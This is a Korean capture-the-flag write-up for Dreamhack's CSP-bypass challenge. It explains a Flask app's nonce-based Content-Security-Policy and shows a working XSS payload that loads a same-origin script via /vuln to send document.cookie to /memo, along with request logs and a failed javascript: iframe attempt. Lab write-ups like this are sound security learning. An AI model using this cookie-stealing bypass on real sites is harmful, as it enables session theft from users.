# Challenge: dreamhack - CSP-bypass

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/435/
이전 XSS나 XSS-bypass와 코드가 유사하다.


## 추가학습
### Flask의 요청 처리 순서
1. @app.before_request # 요청 처리 전
2. @app.route # 실제 라우트 함수 실행
3. @app.after_request # 응답 반환 전
4. @app.teardown_request # 요청 완료 후
* after_request는 모든 요청에 대해 응답을 보내기 직전에 실행된다. HTTP 헤더 추가/수정에 주로 사용한다.

### 

## 문제 풀이
step 1
* app.py 부분을 보자. Content Security Policy를 설정하고 있다.
    * default-src 'self' : 현재 도메인에서만 리소스 로드를 허용한다. 외부 도메인에서의 리소스 로드를 차단하는 역할
    * img-src https://dreamhack.io : 이미지 로드는 해당 사이트에서만 허용
    * style-src 'self' 'unsafe-inline' : 현재 도메인의 css 파일을 허용하는데 unsafe-inline이 설정되어 있어 인라인 css를 허용한다.
    * script-src 'self' 'nonce-{nonce}' : 같은 출처 내의 파일만 script의 src로 올 수 있게 허용하되 특정 nonce 값을 가지고 있어야 한다. nonce = os.urandom(16).hex()로 16바이트 랜덤 값을 hex로 요청 시마다 변환한다. 따라서 nonce 예측은 불가
    ```
    @app.after_request
    def add_header(response):
        global nonce
        response.headers[
            "Content-Security-Policy"
        ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
        nonce = os.urandom(16).hex()
        return response
    ```

step 2 - 페이로드 작성
* 다음 페이로드를 폼에 전송하자. 콘솔에 나오는 요청 부분은 다음과 같다. 여기서 %2b 처리를 해서 보내는 이유는 만약 url 인코딩을 하지 않고 "+" 기호를 보낼 경우, urllib에 의해 한 번 인코딩, script 두 번 디코딩에 의해 "+" 자체가 GET 요청에 들어가면서 공백으로 처리되기 때문이다.
```html
<script src="/vuln?param=location.href='/memo?memo='%2bdocument.cookie"></script>

127.0.0.1 - - [] "GET /vuln?param=<script%20src%3D"/vuln?param%3Dlocation.href%3D'/memo?memo%3D'%252bdocument.cookie"></script> HTTP/1.1" 200 -

127.0.0.1 - - [] "GET /vuln?param=location.href='/memo?memo='%2bdocument.cookie HTTP/1.1" 200 

127.0.0.1 - - [] "POST /flag HTTP/1.1" 200 

```

* 이 페이로드가 url 인코딩을 하지 않고 보냈을 때의 결과이다. 경로상에 "+"가 있어 공백처리된다.
```html
<script src="/vuln?param=location.href='/memo?memo='+document.cookie"></script>

127.0.0.1 - - [] "GET /vuln?param=<script%20src%3D"/vuln?param%3Ddocument.location%3D'/memo?memo%3D'%2Bdocument.cookie"></script> HTTP/1.1" 200 -

127.0.0.1 - - [] "GET /vuln?param=document.location='/memo?memo='+document.cookie HTTP/1.1" 200 -

127.0.0.1 - - [] "POST /flag HTTP/1.1" 200 -
```

### 시행착오
* ```<iframe src="javascript:location.href='/memo?memo='+document.cookie">``` 입력
    * javascript: scheme을 사용하는데 브라우저가 이를 인라인 스크립트 실행으로 취급해 실패한다. 
    * 브라우저에 다음과 같이 테스트를 해보면 에러가 뜬다.
        ```
        var iframe = document.createElement('iframe');
        iframe.src = "javascript:location.href='/memo?memo='+document.cookie";
        document.body.appendChild(iframe);
        ```
    * Refused to run the JavaScript URL because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-87bd6fa8e18e3f2715a23dacc9ffa17b'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
    * iframe.src = "/path/page.html";는 그냥 새로운 문서를 불러오지만 iframe.src = "javascript:alert(1)";는 리소스를 로드하는 것이 아니라 그 문자열을 js 코드로 실행하니 스크립트에 대한 script-src 정책이 동작한 것이다.



## 결과
페이로드를 폼에 제출하면 플래그가 나온다.